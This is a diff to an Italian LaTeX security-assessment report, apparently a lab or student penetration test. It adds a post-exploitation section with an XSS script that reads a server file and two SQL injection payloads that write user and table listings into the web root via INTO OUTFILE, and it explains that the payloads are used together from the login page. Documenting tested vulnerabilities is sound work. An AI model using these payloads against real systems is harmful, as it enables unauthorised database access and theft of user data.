@@ -192,9 +192,35 @@ del campo \textbf{Emial address} ed \`{e} soggetta a XSS.
 
 \section{Post Exploitation}
 
-\texttt{' or null is null INTO OUTFILE '/var/www/html/TEST.txt' \#} \\
-\texttt{<SCRIPT>function test(){fetch('TEST.txt').then(response => response.text()).then(data => alert(data))}test();</SCRIPT>}
+Qui di seguito alcuni script/query che posso permettere nella fase di \textbf{Post Exploitation}
+sia il \textbf{Mantenimento dell'Accesso} che la \textbf{Raccolta Dati}.
 
-\dots
+\begin{enumerate}
+    \item Script per visuaizzare un file del server:\\
+    \texttt{<SCRIPT>function test()\{fetch('TEST.txt').\\
+    then(response => response.text()).then(data => alert(data))\}test(); \\
+    </SCRIPT>}
+    \item SQLi per recuperare l'elenco degli users/customers:\\
+    \texttt{' or null is null INTO OUTFILE '/var/www/html/USERS.txt' \#}
+    \item SQLi per recuperare l'elenco delle tabelle del db: \\
+    \texttt{' or null is not null UNION SELECT null, TABLE\_NAME, TABLE\_SCHEMA \\ 
+    FROM information\_schema.TABLES WHERE TABLE\_SCHEMA not like \\
+    'information\_schema' AND TABLE\_SCHEMA not like 'mysql' AND TABLE\_SCHEMA \\
+    not like 'performance\_schema' INTO OUTFILE '/var/www/html/TABLES.txt' \#}
+\end{enumerate}
+
+Eseguendo prima gli script di SQLi (2 e 3) nella pagina di login e successivamente 
+lo script di XSS (1) \`{e} possibile visualizzare il contenuto dei file USERS.txt 
+e TABLES.txt.\\
+
+\begin{figure}[h]
+    \includegraphics[scale=0.8]{USERS.png}
+    \caption{Elenco users/customers}
+\end{figure}
+
+\begin{figure}[h]
+    \includegraphics[scale=0.8]{TABLES.png}
+    \caption{Elenco tabelle}
+\end{figure}
 
 \end{document}
